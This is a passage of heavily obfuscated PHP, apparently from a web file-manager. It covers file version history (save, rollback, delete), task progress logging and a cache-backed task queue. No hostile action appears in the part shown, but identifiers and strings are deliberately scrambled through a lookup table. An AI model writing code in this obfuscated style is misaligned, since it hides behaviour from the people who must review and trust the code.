($Àâ¯™¿á[$ÔÇ¼Üñ·[78]] >= 1024 * 1024 * 500) { return !1; } $ŞäÅ” = IO::hashSimple($ÀÄÙ†®ê); if ($£‡¦…‹ && $£‡¦…‹[0][$ÔÇ¼Üñ·[643]] == $ŞäÅ”) { return !0; } if (array_key_exists($ÔÇ¼Üñ·[219], $Àâ¯™¿á) && !$Àâ¯™¿á[$ÔÇ¼Üñ·[219]]) { return !1; } $¾¹ïúú = short_id(time()); $¸ËÒÒøí = array($ÔÇ¼Üñ·[445] => $¾¹ïúú, $ÔÇ¼Üñ·[643] => $ŞäÅ”, $ÔÇ¼Üñ·[32] => $Àâ¯™¿á[$ÔÇ¼Üñ·[32]] . $ÔÇ¼Üñ·[10] . date($ÔÇ¼Üñ·[1296]) . rand_string(1), $ÔÇ¼Üñ·[78] => $Àâ¯™¿á[$ÔÇ¼Üñ·[78]], $ÔÇ¼Üñ·[497] => USER_ID, $ÔÇ¼Üñ·[217] => time(), $ÔÇ¼Üñ·[1297] => $ÔÇ¼Üñ·[12]); IO::mkdir($“Ü½¿’¾[$ÔÇ¼Üñ·[1298]]); $÷Şæ×¦ë = IO::copy($ÀÄÙ†®ê, $“Ü½¿’¾[$ÔÇ¼Üñ·[1298]], !1, $¸ËÒÒøí[$ÔÇ¼Üñ·[32]]); if (!$÷Şæ×¦ë) { self::clearEmptyFolder($“Ü½¿’¾[$ÔÇ¼Üñ·[1298]]); return !1; } array_unshift($£‡¦…‹, $¸ËÒÒøí); if (count($£‡¦…‹) > $Óù·íçõ) { $‚æËé£™ = array_slice($£‡¦…‹, $Óù·íçõ); foreach ($‚æËé£™ as $œİµ®†) { IO::remove($“Ü½¿’¾[$ÔÇ¼Üñ·[1298]] . $œİµ®†[$ÔÇ¼Üñ·[32]]); } $£‡¦…‹ = array_slice($£‡¦…‹, 0, $Óù·íçõ); } return self::saveData($“Ü½¿’¾[$ÔÇ¼Üñ·[1299]], $£‡¦…‹); } public static function remove($îÔû¢œ, $æ“Ÿ¼ì¨) { $Ù÷øŸŸÜ =& $_SERVER[Î‹ÃÂŞ„]; $üŠÊ€ıõ = self::listData($îÔû¢œ); $ˆæòéˆ¤ = array(); if (!$üŠÊ€ıõ) { return !1; } foreach ($üŠÊ€ıõ[$Ù÷øŸŸÜ[415]] as $šú•÷Á) { if ($šú•÷Á[$Ù÷øŸŸÜ[445]] == $æ“Ÿ¼ì¨) { IO::remove($üŠÊ€ıõ[$Ù÷øŸŸÜ[1298]] . $šú•÷Á[$Ù÷øŸŸÜ[32]]); continue; } $ˆæòéˆ¤[] = $šú•÷Á; } return self::saveData($üŠÊ€ıõ[$Ù÷øŸŸÜ[1299]], $ˆæòéˆ¤); } public static function clear($ç’Ù, $×ë»åÊã = true) { $°Šäö«ƒ =& $_SERVER[Î‹ÃÂŞ„]; $»Ùø‰‰ = self::listData($ç’Ù, $×ë»åÊã); if (!$»Ùø‰‰) { return !1; } foreach ($»Ùø‰‰[$°Šäö«ƒ[415]] as $÷Ùó‘ñ) { IO::remove($»Ùø‰‰[$°Šäö«ƒ[1298]] . $÷Ùó‘ñ[$°Šäö«ƒ[32]]); } return self::saveData($»Ùø‰‰[$°Šäö«ƒ[1299]], array()); } public static function moveHistory($ŠØÀ†•Ö, $°ÓáôÕ = '', $ßÓ¨©Å = '') { $öÚîÜ˜Ç =& $_SERVER[Î‹ÃÂŞ„]; $ñõÈÊå = self::listData($ŠØÀ†•Ö, !1); if (!$ñõÈÊå || !$ñõÈÊå[$öÚîÜ˜Ç[415]]) { return !1; } $‡˜Ã²¿¼ = $öÚîÜ˜Ç[1286]; $°ÓáôÕ = $°ÓáôÕ ? $°ÓáôÕ : get_path_this($ŠØÀ†•Ö); $ßÓ¨©Å = $ßÓ¨©Å ? $ßÓ¨©Å : $ñõÈÊå[$öÚîÜ˜Ç[1298]]; $˜Œ„–ïî = substr(get_path_this($ñõÈÊå[$öÚîÜ˜Ç[1299]]), 0, -strlen($‡˜Ã²¿¼)); foreach ($ñõÈÊå[$öÚîÜ˜Ç[415]] as $³’…”÷Ğ => $†˜¢‰ø”) { $§ê‹èƒã = $°ÓáôÕ . substr($†˜¢‰ø”[$öÚîÜ˜Ç[32]], strlen($˜Œ„–ïî)); $ü¸¦Áñ = IO::move($ñõÈÊå[$öÚîÜ˜Ç[1298]] . $†˜¢‰ø”[$öÚîÜ˜Ç[32]], $ßÓ¨©Å, !1, $§ê‹èƒã); if ($ü¸¦Áñ) { $ñõÈÊå[$öÚîÜ˜Ç[415]][$³’…”÷Ğ][$öÚîÜ˜Ç[32]] = $§ê‹èƒã; } } $ñõÈÊå[$öÚîÜ˜Ç[1299]] = IO::move($ñõÈÊå[$öÚîÜ˜Ç[1299]], $ßÓ¨©Å, !1, $°ÓáôÕ . $‡˜Ã²¿¼); self::saveData($ñõÈÊå[$öÚîÜ˜Ç[1299]], $ñõÈÊå[$öÚîÜ˜Ç[415]]); self::clearEmptyFolder($ñõÈÊå[$öÚîÜ˜Ç[1298]]); } public static function rollback($ÌŸë­üš, $×¥®é·Â) { $Í‰ùµÌÕ =& $_SERVER[Î‹ÃÂŞ„]; $Í“Ç¨¶È = self::listData($ÌŸë­üš); if (!$Í“Ç¨¶È) { return; } $ıóşÔêä = IO::info($ÌŸë­üš); foreach ($Í“Ç¨¶È[$Í‰ùµÌÕ[415]] as $ªé·èá => $¨æŸäÑä) { if ($¨æŸäÑä[$Í‰ùµÌÕ[445]] == $×¥®é·Â) { self::add($ÌŸë­üš); $±äƒ¤á¬ = $Í“Ç¨¶È[$Í‰ùµÌÕ[1298]] . $¨æŸäÑä[$Í‰ùµÌÕ[32]]; $×„Üõ’È = IO::copy($±äƒ¤á¬, IO::pathFather($ÌŸë­üš), REPEAT_REPLACE, $ıóşÔêä[$Í‰ùµÌÕ[32]]); if ($×„Üõ’È) { self::remove($ÌŸë­üš, $×¥®é·Â); } return $×„Üõ’È; } } return !1; } public static function setDetail($Ö‰ú’ˆÂ, $”Í²“, $•Ä­ôŠ) { $››Ø¨Ä =& $_SERVER[Î‹ÃÂŞ„]; $¸™ñšÇ” = self::listData($Ö‰ú’ˆÂ); if (!$¸™ñšÇ”) { return; } foreach ($¸™ñšÇ”[$››Ø¨Ä[415]] as $«‡ñ±­Ğ => $éœ÷Î³¡) { if ($éœ÷Î³¡[$››Ø¨Ä[445]] == $”Í²“) { $¸™ñšÇ”[$››Ø¨Ä[415]][$«‡ñ±­Ğ][$››Ø¨Ä[1297]] = $•Ä­ôŠ; self::saveData($¸™ñšÇ”[$››Ø¨Ä[1299]], $¸™ñšÇ”[$››Ø¨Ä[415]]); return !0; } } return !1; } public static function fileInfo($Şú•–‡®, $¬Õ…Û¿) { $½©„ºş¬ =& $_SERVER[Î‹ÃÂŞ„]; $Öø¸â = self::listData($Şú•–‡®); if (!$Öø¸â) { show_json(LNG($½©„ºş¬[107]), !1); } $ÌùÇÁ¿ = $½©„ºş¬[12]; foreach ($Öø¸â[$½©„ºş¬[415]] as $Ô—ôÈ™Ñ => $¨—¶³›) { if ($¨—¶³›[$½©„ºş¬[445]] != $¬Õ…Û¿) { continue; } $ÌùÇÁ¿ = $Öø¸â[$½©„ºş¬[1298]] . $¨—¶³›[$½©„ºş¬[32]]; break; } if (!$ÌùÇÁ¿) { show_json(LNG($½©„ºş¬[107]), !1); } return IO::info($ÌùÇÁ¿); } public static function fileOut($Öô©ÕÁ, $£ìûâğŞ, $„¹´…Ú = false) { $Ğ§ë¼ö¼ =& $_SERVER[Î‹ÃÂŞ„]; $Œµ±”ùÓ = self::fileInfo($Öô©ÕÁ, $£ìûâğŞ); $²ƒ«º±û =& $GLOBALS[$Ğ§ë¼ö¼[7]]; $„¹´…Ú = isset($²ƒ«º±û[$Ğ§ë¼ö¼[1249]]) && $²ƒ«º±û[$Ğ§ë¼ö¼[1249]] == 1; if (isset($²ƒ«º±û[$Ğ§ë¼ö¼[33]]) && $²ƒ«º±û[$Ğ§ë¼ö¼[33]] == $Ğ§ë¼ö¼[1300]) { return IO::fileOutImage($Œµ±”ùÓ[$Ğ§ë¼ö¼[86]], $²ƒ«º±û[$Ğ§ë¼ö¼[1301]]); } IO::fileOut($Œµ±”ùÓ[$Ğ§ë¼ö¼[86]], $„¹´…Ú, get_path_this($Öô©ÕÁ)); } public static function listData($„’°ºúş, $è¾ƒÕäã = true) { $ÄÏÓ‘âİ =& $_SERVER[Î‹ÃÂŞ„]; if ($è¾ƒÕäã && !IO::exist($„’°ºúş)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($„’°ºúş, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $şØ×Û = self::pathHistory($„’°ºúş); $Í½ï‘âÀ = array($ÄÏÓ‘âİ[1299] => $şØ×Û . $ÄÏÓ‘âİ[1286], $ÄÏÓ‘âİ[1298] => rtrim(get_path_father($şØ×Û), $ÄÏÓ‘âİ[8]) . $ÄÏÓ‘âİ[8], $ÄÏÓ‘âİ[415] => array()); $œõ…¬òÃ = IO::getContent($Í½ï‘âÀ[$ÄÏÓ‘âİ[1299]]); if ($œõ…¬òÃ) { $üĞ¸öıÛ = json_decode($œõ…¬òÃ, !0); if (is_array($üĞ¸öıÛ)) { $Í½ï‘âÀ[$ÄÏÓ‘âİ[415]] = $üĞ¸öıÛ; } } return $Í½ï‘âÀ; } private static function saveData($ÛÎ™÷ÊÓ, $ĞÎŠŸ Ê) { $ÔñçÒÀ =& $_SERVER[Î‹ÃÂŞ„]; self::log($ÔñçÒÀ[1302] . $ÛÎ™÷ÊÓ . $ÔñçÒÀ[73] . count($ĞÎŠŸ Ê), $ÔñçÒÀ[798]); if ($ĞÎŠŸ Ê) { return IO::setContent($ÛÎ™÷ÊÓ, json_encode($ĞÎŠŸ Ê)); } $‰°ã“Ïš = IO::pathFather($ÛÎ™÷ÊÓ); IO::remove($ÛÎ™÷ÊÓ); self::clearEmptyFolder($‰°ã“Ïš); return !0; } public static function clearEmptyFolder($©Éß¸öê) { $Å ŸÆ =& $_SERVER[Î‹ÃÂŞ„]; if (trim($©Éß¸öê, $Å ŸÆ[8]) == trim(self::$_historyBase, $Å ŸÆ[8])) { return; } $¾ø¦ñ´¢ = IO::pathFather($©Éß¸öê); $ûóğáÒ = IO::has($©Éß¸öê, !0); if ($ûóğáÒ[$Å ŸÆ[225]] > 0 || $ûóğáÒ[$Å ŸÆ[226]] > 0) { return; } IO::remove($©Éß¸öê); self::clearEmptyFolder($¾ø¦ñ´¢); } private static function getBasePath() { $”»Í¬êÖ =& $_SERVER[Î‹ÃÂŞ„]; $ôÅª»®È = Model($”»Í¬êÖ[1303])->get($”»Í¬êÖ[1304]); if ($ôÅª»®È) { if (!IO::exist($ôÅª»®È)) { IO::mkdir($ôÅª»®È); } if (get_path_this($ôÅª»®È) == $”»Í¬êÖ[1289]) { $’Š¶²©Ü = $”»Í¬êÖ[1305] . rand_string(8); @rename($ôÅª»®È, get_path_father($ôÅª»®È) . $”»Í¬êÖ[8] . $’Š¶²©Ü); $ôÅª»®È = DATA_PATH . $’Š¶²©Ü . $”»Í¬êÖ[8]; file_put_contents(DATA_PATH . $”»Í¬êÖ[1239], $”»Í¬êÖ[12]); Model($”»Í¬êÖ[1303])->set($”»Í¬êÖ[1304], $ôÅª»®È); } return $ôÅª»®È; } $ôÅª»®È = DATA_PATH . $”»Í¬êÖ[1305] . rand_string(8) . $”»Í¬êÖ[8]; $ôÅª»®È = IO::mkdir($ôÅª»®È); $ôÅª»®È = rtrim($ôÅª»®È, $”»Í¬êÖ[8]) . $”»Í¬êÖ[8]; file_put_contents($ôÅª»®È . $”»Í¬êÖ[1239], $”»Í¬êÖ[12]); file_put_contents(DATA_PATH . $”»Í¬êÖ[1239], $”»Í¬êÖ[12]); Model($”»Í¬êÖ[1303])->set($”»Í¬êÖ[1304], $ôÅª»®È); return $ôÅª»®È; } } goto cĞˆ¬ßøå; f¡§ê²”­: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‰…ÆòÙ, $‰›©òº = '', $À¤ÉÚ¬É = 0, $Š»Ñ¸àä = '') { $÷²ŞÍ±÷ =& $_SERVER[Î‹ÃÂŞ„]; $Š»Ñ¸àä = $Š»Ñ¸àä ? $Š»Ñ¸àä : ($‰›©òº ? $‰›©òº : $‰…ÆòÙ); $åİ¥Âãø = new Task($‰…ÆòÙ, $‰›©òº, $À¤ÉÚ¬É, $Š»Ñ¸àä); $GLOBALS[$÷²ŞÍ±÷[1787] . $‰…ÆòÙ] = new TaskLog($÷²ŞÍ±÷[1688], $åİ¥Âãø, $Š»Ñ¸àä); return $åİ¥Âãø; } public function __construct($˜û±–‚Õ = '', $Ø÷«µÌĞ = '', $ìÊ¡¤Š¼ = '') { $ùÃÙ­¾ =& $_SERVER[Î‹ÃÂŞ„]; if (!$˜û±–‚Õ) { $˜û±–‚Õ = $ùÃÙ­¾[1688]; } $¡ğÔ‹óˆ = $˜û±–‚Õ . $ùÃÙ­¾[432] . rand_string(10); if (!$ìÊ¡¤Š¼) { $ìÊ¡¤Š¼ = $˜û±–‚Õ . $ùÃÙ­¾[53] . $ìÊ¡¤Š¼; } switch ($˜û±–‚Õ) { case $ùÃÙ­¾[1688]: if (!$Ø÷«µÌĞ || !$Ø÷«µÌĞ->task) { return echoLog($˜û±–‚Õ . $ùÃÙ­¾[1788]); } $€£êºì› = $Ø÷«µÌĞ; $¡ğÔ‹óˆ = $€£êºì›->task[$ùÃÙ­¾[445]]; $˜û±–‚Õ = $€£êºì›->task[$ùÃÙ­¾[445]]; if (!$€£êºì›->task[$ùÃÙ­¾[1600]]) { $€£êºì›->task[$ùÃÙ­¾[1600]] = $ìÊ¡¤Š¼ ? $ìÊ¡¤Š¼ : $˜û±–‚Õ; } break; case $ùÃÙ­¾[1789]: if (!$Ø÷«µÌĞ) { return echoLog($˜û±–‚Õ . $ùÃÙ­¾[1790]); } $®‚Ïà´ = is_string($Ø÷«µÌĞ) ? array($Ø÷«µÌĞ) : $Ø÷«µÌĞ; $€£êºì› = new TaskFileTransfer($¡ğÔ‹óˆ, $˜û±–‚Õ, 0, $ìÊ¡¤Š¼ ? $ìÊ¡¤Š¼ : $®‚Ïà´[0]); foreach ($®‚Ïà´ as $•ãà¬¢á) { $€£êºì›->addPath($•ãà¬¢á); } break; case $ùÃÙ­¾[359]: if (!$Ø÷«µÌĞ) { return echoLog($˜û±–‚Õ . $ùÃÙ­¾[1790]); } $®‚Ïà´ = is_string($Ø÷«µÌĞ) ? array($Ø÷«µÌĞ) : $Ø÷«µÌĞ; $€£êºì› = new TaskZip($¡ğÔ‹óˆ, $˜û±–‚Õ, 0, $ìÊ¡¤Š¼ ? $ìÊ¡¤Š¼ : $®‚Ïà´[0]); foreach ($®‚Ïà´ as $•ãà¬¢á) { $€£êºì›->addPath($•ãà¬¢á); } break; case $ùÃÙ­¾[1269]: if (!$Ø÷«µÌĞ) { return echoLog($˜û±–‚Õ . $ùÃÙ­¾[1790]); } $€£êºì› = new TaskUnZip($¡ğÔ‹óˆ, $˜û±–‚Õ, 0, $ìÊ¡¤Š¼ ? $ìÊ¡¤Š¼ : $Ø÷«µÌĞ); if ($Ø÷«µÌĞ) { $€£êºì›->addFile($Ø÷«µÌĞ); } break; case $ùÃÙ­¾[151]: $€£êºì› = new TaskHttp($¡ğÔ‹óˆ, $˜û±–‚Õ); break; default: return; break; } $this->task = $€£êºì›; $this->taskID = $¡ğÔ‹óˆ; Hook::bind($ùÃÙ­¾[1725], array($this, $ùÃÙ­¾[1791])); Hook::bind($ùÃÙ­¾[1727], array($this, $ùÃÙ­¾[1792])); Hook::bind($ùÃÙ­¾[1721], array($this, $ùÃÙ­¾[1793])); echoLog($ùÃÙ­¾[1794] . $€£êºì›->task[$ùÃÙ­¾[1600]]); } public function __destruct() { $this->end(); } public function end($°çÉŒ” = '') { $Ú®Ë×—ã =& $_SERVER[Î‹ÃÂŞ„]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($°çÉŒ”); $this->task = !1; $this->taskID = !1; Hook::unbind($Ú®Ë×—ã[1725], array($this, $Ú®Ë×—ã[1791])); Hook::unbind($Ú®Ë×—ã[1727], array($this, $Ú®Ë×—ã[1792])); Hook::unbind($Ú®Ë×—ã[1721], array($this, $Ú®Ë×—ã[1793])); } public function taskUpdate($œ›“ÅŠ¯) { $ÄÑĞŞ  =& $_SERVER[Î‹ÃÂŞ„]; if (!$œ›“ÅŠ¯ || $this->taskID != $œ›“ÅŠ¯[$ÄÑĞŞ [445]]) { return; } $„ÇÁä— = 20; $ªäò×’ = intval($œ›“ÅŠ¯[$ÄÑĞŞ [1706]] * $„ÇÁä—); $’ŞĞÍØë = $ÄÑĞŞ [165] . str_repeat($ÄÑĞŞ [938], $ªäò×’) . $ÄÑĞŞ [1069] . str_repeat($ÄÑĞŞ [53], $„ÇÁä— - $ªäò×’) . $ÄÑĞŞ [167]; $¢Ôõ‹— = $’ŞĞÍØë . sprintf($ÄÑĞŞ [1795], $œ›“ÅŠ¯[$ÄÑĞŞ [1706]] * 100) . $ÄÑĞŞ [1796]; $¶ñÉãıË = $¢Ôõ‹— . $œ›“ÅŠ¯[$ÄÑĞŞ [1705]] . $ÄÑĞŞ [8] . $œ›“ÅŠ¯[$ÄÑĞŞ [833]] . LNG($ÄÑĞŞ [1797]); $Æ‘ğ‡Õˆ = $ÄÑĞŞ [12]; if ($œ›“ÅŠ¯[$ÄÑĞŞ [1781]]) { $¶ñÉãıË = $¢Ôõ‹— . size_format($œ›“ÅŠ¯[$ÄÑĞŞ [1705]]) . $ÄÑĞŞ [8] . size_format($œ›“ÅŠ¯[$ÄÑĞŞ [833]]); $Æ‘ğ‡Õˆ = size_format($œ›“ÅŠ¯[$ÄÑĞŞ [1707]]) . $ÄÑĞŞ [1798]; } if ($œ›“ÅŠ¯[$ÄÑĞŞ [1119]]) { $œ›“ÅŠ¯[$ÄÑĞŞ [1755]] = $œ›“ÅŠ¯[$ÄÑĞŞ [1119]] . $ÄÑĞŞ [53] . $œ›“ÅŠ¯[$ÄÑĞŞ [1755]]; } if ($œ›“ÅŠ¯[$ÄÑĞŞ [1755]]) { $¹¼–Çú† = $ÄÑĞŞ [12]; if ($œ›“ÅŠ¯[$ÄÑĞŞ [1757]]) { $¹¼–Çú† = $ÄÑĞŞ [50] . size_format($œ›“ÅŠ¯[$ÄÑĞŞ [1758]]) . $ÄÑĞŞ [8] . size_format($œ›“ÅŠ¯[$ÄÑĞŞ [1757]]); } $Æ‘ğ‡Õˆ .= $œ›“ÅŠ¯[$ÄÑĞŞ [1755]] . $¹¼–Çú†; } if ($œ›“ÅŠ¯[$ÄÑĞŞ [810]] && !$œ›“ÅŠ¯[$ÄÑĞŞ [1757]]) { $Æ‘ğ‡Õˆ .= $ÄÑĞŞ [53] . size_format($œ›“ÅŠ¯[$ÄÑĞŞ [1762]]) . $ÄÑĞŞ [8] . size_format($œ›“ÅŠ¯[$ÄÑĞŞ [810]]); } echoLog($¶ñÉãıË . $ÄÑĞŞ [53] . $Æ‘ğ‡Õˆ, !0); } public function taskEnd($‰Â›ÔŠ) { $‘ùëÚºÂ =& $_SERVER[Î‹ÃÂŞ„]; if (!$‰Â›ÔŠ || $this->taskID != $‰Â›ÔŠ[$‘ùëÚºÂ[445]]) { return; } $å²ì”Ë™ = $‰Â›ÔŠ ? $‰Â›ÔŠ[$‘ùëÚºÂ[1705]] . $‘ùëÚºÂ[8] . $‰Â›ÔŠ[$‘ùëÚºÂ[833]] . LNG($‘ùëÚºÂ[1797]) . $‘ùëÚºÂ[73] : $‘ùëÚºÂ[12]; echoLog($‘ùëÚºÂ[1799] . $‰Â›ÔŠ[$‘ùëÚºÂ[1600]] . ($‰Â›ÔŠ[$‘ùëÚºÂ[496]] ? $‘ùëÚºÂ[73] . $‰Â›ÔŠ[$‘ùëÚºÂ[496]] : $‘ùëÚºÂ[12]) . $‘ùëÚºÂ[73] . $å²ì”Ë™ . $‘ùëÚºÂ[1800] . sprintf($‘ùëÚºÂ[898], timeFloat() - $‰Â›ÔŠ[$‘ùëÚºÂ[1708]]) . $‘ùëÚºÂ[1720]); $this->end(); } public function taskKill($ÄÓ¨”ÄŸ) { $ÜŸ¢èçù =& $_SERVER[Î‹ÃÂŞ„]; if (!$ÄÓ¨”ÄŸ || $this->taskID != $ÄÓ¨”ÄŸ[$ÜŸ¢èçù[445]]) { return; } echoLog($ÜŸ¢èçù[1801] . $ÄÓ¨”ÄŸ[$ÜŸ¢èçù[1600]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\121\x75\145\165\145\114\x65\156\147\164\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\x75\x65\x75\x65\104\x61\x74\141"; const QUEUE_TIME = "\164\x61\x73\153\x51\x75\145\165\x65\x4c\x61\x73\164\122\165\156"; const QUEUE_THREAD = "\x74\x61\x73\x6b\x51\x75\145\165\145\124\150\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Œñ„œ¹¡, $êº…‘µ = array(), $ÇÌÃÈüè = '', $­ì˜ö¨ = '') { $‚ş±±±§ =& $_SERVER[Î‹ÃÂŞ„]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($­ì˜ö¨ && array_find_by_field(self::$listData, $‚ş±±±§[96], $­ì˜ö¨)) { return !0; } if ($­ì˜ö¨ && array_find_by_field(self::$listDataAdd, $‚ş±±±§[96], $­ì˜ö¨)) { return !0; } self::$listDataAdd[] = array($‚ş±±±§[310] => $Œñ„œ¹¡, $‚ş±±±§[1802] => $êº…‘µ, $‚ş±±±§[496] => $ÇÌÃÈüè, $‚ş±±±§[96] => $­ì˜ö¨); return !0; } public static function addSubmit() { $¬Â¯›â¨ =& $_SERVER[Î‹ÃÂŞ„]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¬Â¯›â¨[1803] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¬Â¯›â¨[12], $¬Â¯›â¨[496])), $¬Â¯›â¨[187]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ë¹’Ùº, $Õ¥“Å¤ = array(), $§º×Ë³ = '', $ƒ¥õÓóÌ = '') { $Óşœİı =& $_SERVER[Î‹ÃÂŞ„]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‘±÷ÈÀÍ = self::getAll(); if ($ƒ¥õÓóÌ && array_find_by_field($‘±÷ÈÀÍ, $Óşœİı[96], $ƒ¥õÓóÌ)) { return !0; } $‘±÷ÈÀÍ[] = array($Óşœİı[310] => $Ë¹’Ùº, $Óşœİı[1802] => $Õ¥“Å¤, $Óşœİı[496] => $§º×Ë³, $Óşœİı[96] => $ƒ¥õÓóÌ); self::setAll($‘±÷ÈÀÍ); write_log($Óşœİı[1803] . $§º×Ë³, $Óşœİı[187]); return !0; } public static function run() { $ë¼œ’ä =& $_SERVER[Î‹ÃÂŞ„]; $ÀŠëôèì = self::getAll(); $…éÃğõ = array_shift($ÀŠëôèì); if (!$…éÃğõ) { return !1; } self::setAll($ÀŠëôèì); $ç‰¯¦æ— = timeFloat(); $áò¢’ã± = $ë¼œ’ä[12]; try { $áò¢’ã± = Hook::apply($…éÃğõ[$ë¼œ’ä[310]], $…éÃğõ[$ë¼œ’ä[1802]]); } catch (Exception $ú„½³ï) { write_log($ú„½³ï, $ë¼œ’ä[1237]); } $ª…æ‚ù´ = number_format(timeFloat() - $ç‰¯¦æ—, 3) . $ë¼œ’ä[1720]; if ($áò¢’ã± && is_string($áò¢’ã±)) { $ª…æ‚ù´ = $ª…æ‚ù´ . $ë¼œ’ä[1804] . $áò¢’ã±; } write_log($ë¼œ’ä[1805] . $…éÃğõ[$ë¼œ’ä[496]] . $ë¼œ’ä[1806] . $ª…æ‚ù´, $ë¼œ’ä[187]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ÜÓ°Šø =& $_SERVER[Î‹ÃÂŞ„]; $›ïÕ€—ê = self::threadCount() + 1; if ($›ïÕ€—ê > 3 || !self::count()) { return; } write_log($ÜÓ°Šø[1807] . $›ïÕ€—ê, $ÜÓ°Šø[187]); Cache::set(self::QUEUE_THREAD, $›ïÕ€—ê, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ÜÓ°Šø[1808], $ÜÓ°Šø[187]); } public static function getKey($±¥ŒßËê, $Ç·È¬Ó = "\x69\x6e\x74") { $’‚‡Òü™ =& $_SERVER[Î‹ÃÂŞ„]; Cache::removeMemory($±¥ŒßËê); $Şúé²Šì = Cache::get($±¥ŒßËê); if ($Ç·È¬Ó == $’‚‡Òü™[334]) { return $Şúé²Šì ? intval($Şúé²Šì) : 0; } if ($Ç·È¬Ó == $’‚‡Òü™[1809]) { return is_array($Şúé²Šì) ? $Şúé²Šì : array(); } return $Şúé²Šì; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Î‹ÃÂŞ„][1809]); } public static function setAll($–æ÷ù¡š) { $¹õ¿–„® = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($–æ÷ù¡š), $¹õ¿–„®); Cache::set(self::QUEUE_DATA, $–æ÷ù¡š, $¹õ¿–„®); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($øÌ¬°À, $œµ–È… = 5.0) { if (!$øÌ¬°À) { return; } $ì³¯î³‡ = Cache::get($øÌ¬°À); if (!$ì³¯î³‡ || timeFloat() - floatVal($ì³¯î³‡) >= $œµ–È…) { Cache::set($øÌ¬°À, timeFloat(), $œµ–È… * 10); return !0; } return !1; } public static function timeLimitCall($Ø¤ÔÕíÓ, $³øÍÙ²½, $ù¨åê ², $„»õ¹¹¬ = 5.0) { $¢¬Ú¶®å =& $_SERVER[Î‹ÃÂŞ„]; if (!$Ø¤ÔÕíÓ || !$³øÍÙ²½) { return; } self::$asyncAdd = !0; $…œ€È•÷ = $¢¬Ú¶®å[1810]; $†ü½é = Cache::get($…œ€È•÷, !0); $®è³ È¸ = array($¢¬Ú¶®å[1811] => timeFloat(), $¢¬Ú¶®å[1812] => timeFloat(), $¢¬Ú¶®å[310] => $³øÍÙ²½, $¢¬Ú¶®å[1802] => $ù¨åê ², $¢¬Ú¶®å[196] => $„»õ¹¹¬); if (is_array($†ü½é[$Ø¤ÔÕíÓ])) { $®è³ È¸[$¢¬Ú¶®å[1812]] = $†ü½é[$Ø¤ÔÕíÓ][$¢¬Ú¶®å[1812]]; } if (is_array($†ü½é[$Ø¤ÔÕíÓ])) { if (timeFloat() - $†ü½é[$Ø¤ÔÕíÓ][$¢¬Ú¶®å[1811]] < $®è³ È¸[$¢¬Ú¶®å[196]] * 0.3) { return; } $®è³ È¸[$¢¬Ú¶®å[1812]] = $†ü½é[$Ø¤ÔÕíÓ][$¢¬Ú¶®å[1812]]; } $†ü½é[$Ø¤ÔÕíÓ] = $®è³ È¸; Cache::set($…œ€È•÷, $†ü½é, 60); Cache::removeMemory($…œ€È•÷); write_log($¢¬Ú¶®å[1813] . $Ø¤ÔÕíÓ . $¢¬Ú¶®å[73] . $³øÍÙ²½, $¢¬Ú¶®å[187]); } public static function timeLimitCallLoop() { $‰£ÎùÂº =& $_SERVER[Î‹ÃÂŞ„]; $¤¢Ã‡§• = array($‰£ÎùÂº[1814]); $ËüşĞÃ = in_array(strtolower(ACTION), $¤¢Ã‡§•); if (!$ËüşĞÃ && !self::$asyncAdd) { return; } $î™ì¥Ûà = $‰£ÎùÂº[1810]; $ì„­“êá = Cache::get($î™ì¥Ûà, !0); if (!$ì„­“êá || count($ì„­“êá) <= 0) { return; } $öé‘öªß = !1; $›•üĞ®õ = timeFloat(); $ÓŸ‹ºç = array(); foreach ($ì„­“êá as $ù´ŒĞ™Õ => $¶ñ‹ÌÀ‚) { if ($›•üĞ®õ - $¶ñ‹ÌÀ‚[$‰£ÎùÂº[1812]] > $¶ñ‹ÌÀ‚[$‰£ÎùÂº[196]]) { $öé‘öªß = !0; try { Hook::apply($¶ñ‹ÌÀ‚[$‰£ÎùÂº[310]], $¶ñ‹ÌÀ‚[$‰£ÎùÂº[1802]]); write_log($‰£ÎùÂº[1815] . $ù´ŒĞ™Õ . $‰£ÎùÂº[73] . $¶ñ‹ÌÀ‚[$‰£ÎùÂº[310]] . $‰£ÎùÂº[1816] . ACTION, $‰£ÎùÂº[187]); } catch (Exception $­éäöñÙ) { } continue; } $ÓŸ‹ºç[$ù´ŒĞ™Õ] = $¶ñ‹ÌÀ‚; } if (!$öé‘öªß) { return; } if (!$ÓŸ‹ºç) { return Cache::remove($î™ì¥Ûà); } Cache::set($î™ì¥Ûà, $ÓŸ‹ºç, 60); Cache::removeMemory($î™ì¥Ûà); } public static function finished($©ß‚Ñ§ , $ùÏŞªşá) { $Ê»‹ñŠğ =& $_SERVER[Î‹ÃÂŞ„]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ê»‹ñŠğ[310] => $©ß‚Ñ§ , 